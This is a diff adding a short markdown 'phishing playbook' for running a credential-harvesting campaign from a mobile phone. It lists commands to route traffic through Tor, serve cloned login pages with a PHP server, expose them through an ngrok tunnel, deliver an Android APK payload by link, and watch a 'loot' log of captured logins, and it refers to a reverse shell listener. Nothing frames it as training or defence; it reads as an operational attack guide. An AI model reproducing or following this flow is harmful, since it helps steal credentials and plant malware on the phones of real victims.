@@ -1,0 +1,38 @@
+🐉 Kydras Phishing Playbook (Mobile Edition) 🐉
+
+🎯 Objective: Quick phishing attack setup and delivery flow — mobile-friendly, low footprint.
+
+---
+
+✅ 1. Stealth Setup:
+- Activate Orbot or Termux Tor
+- proxychains curl https://ifconfig.me (verify stealth)
+
+✅ 2. Phishing Server (Mobile):
+- Install:
+pkg install php -y
+- Start local phishing server:
+php -S 0.0.0.0:8080 -t ~/Kydras-Payloads/phish-templates/
+- Optional: Ngrok tunnel for external access:
+ngrok http 8080
+
+✅ 3. Phish Template Options:
+~/Kydras-Payloads/phish-templates/
+- Facebook clone (Coming soon)
+- Instagram clone (Coming soon)
+- Custom login pages
+
+✅ 4. Payload Delivery (optional):
+Combine phishing with Android payload delivery via direct APK link:
+- Example:
+http://public-ngrok-link/android_kydras_payload.apk
+
+✅ 5. Listener Setup:
+- Reverse shell listener → see Payloads Playbook
+- Data capture (phishing):
+tail -f ~/Kydras_Loot/phish.log
+
+✅ 6. Clean Up:
+- Kill PHP and Ngrok processes after engagement.
+
+🐉 Phish Smart. Hit Fast. Stay Mobile.
